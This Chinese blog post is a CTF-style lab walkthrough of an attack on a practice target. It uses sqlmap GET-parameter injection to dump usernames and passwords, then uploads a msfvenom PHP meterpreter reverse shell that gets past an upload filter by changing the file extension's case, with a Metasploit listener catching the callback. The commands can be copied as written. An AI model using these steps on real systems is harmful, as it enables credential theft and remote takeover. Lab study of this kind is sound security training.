---
title: 【网络安全0x06】SQL注入之get参数注入
date: 2020-05-26 11:53:08
tags: [网络安全, owasp_zap, sqlmap, metasploit]
---

51CTO的网课，本篇利用nmap搜索开放端口，dirb挖掘敏感目录，使用owasp zap扫描可利用漏洞，用sqlmap进行get参数注入，获取用户名和口令，上传反弹shell，获得权限，拿到flag。

本篇使用工具owasp zap，sqlmap，metasploit。

<!-- more -->

# 使用命令

## sqlmap

``` bash
sqlmap -u [“url”] --dbs #获取数据库
sqlmap -u [“url”] --current-user #获取当前用户名称 ：
sqlmap -u [“url”] --current-db #获取当前数据库名称
sqlmap -u [“url”] -D [‘数据库名’] --tables   #列出表名 ： 
sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns #列出字段 
sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump #获取字段内容
```

## metasploit

``` bash
# msfvenom生成php反弹shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机port -f raw > shell.php

# msf开启监听
msfconsole
>use exploit/multi/handler
>set payload php/meterpreter/reverse_tcp
>set lhost 攻击机IP
>set lport 攻击机port
```

# 渗透记录

1. nmap扫描靶机IP地址开放端口，`nc`命令探测大端口的banner，获得两个flag：

``` bash
nmap -sV 192.168.1.116
```

![](./1056/1.PNG)

2. `nikto`挖掘`80`端口web信息，找到登录页面：

``` bash
nikto -host http://192.168.1.116/
```

![](./1056/2.PNG)

3. 访问登录页面，尝试弱口令**admin**登录失败：

![](./1056/3.PNG)

4. 使用`owasp zap`扫描网站可利用漏洞，这里利用SQL高危漏洞：

![](./1056/4.PNG)

5. 使用`sqlmap`扫描，可以看到多种get参数注入：

``` bash
sqlmap -u "http://192.168.1.116/cat.php?id=3"
```

![](./1056/5.PNG)

6. 查看数据库列表：

``` bash
sqlmap -u "http://192.168.1.116/cat.php?id=3" --dbs
```

![](./1056/6.PNG)

7. 查看`photoblog`数据库的表：

``` bash
sqlmap -u "http://192.168.1.116/cat.php?id=3" -D photoblog --tables
```

![](./1056/7.PNG)

8. 查看`users`表的字段：

``` bash
sqlmap -u "http://192.168.1.116/cat.php?id=3" -D photoblog -T users --columns
```

![](./1056/8.PNG)

9. 查看`login`和`password`字段内容，得到口令密码：

``` bash
sqlmap -u "http://192.168.1.116/cat.php?id=3" -D photoblog -T users -C login,password --dump
```

![](./1056/9.PNG)

10. 使用口令密码登录后台，准备制作反弹shell来上传：

![](./1056/10.PNG)

11. `msfvenom`制作php反弹shell，编辑掉前面的`/*`：

``` bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机port -f raw > shell.php
```

![](./1056/11.PNG)

12. 网站上传失败，提示**NO PHP!!**：

![](./1056/12.PNG)

13. 修改后缀php变成PHP，绕过检测，上传成功：

![](./1056/13.PNG)

![](./1056/14.PNG)

14. msf设置监听参数：

``` bash
msfconsole
>use exploit/multi/handler
>set payload php/meterpreter/reverse_tcp
>set lhost 192.168.1.114
```

![](./1056/15.PNG)

15. msf开启监听，网站点击shell，靶机拿到shell，不过登录没有flag：

![](./1056/16.PNG)

# 参考资料

1. [2020发布 CTF基础入门/CTF教程零基础 渗透测试/web安全/CTF夺旗【整套教程】](https://www.bilibili.com/video/BV1SJ411h7VW)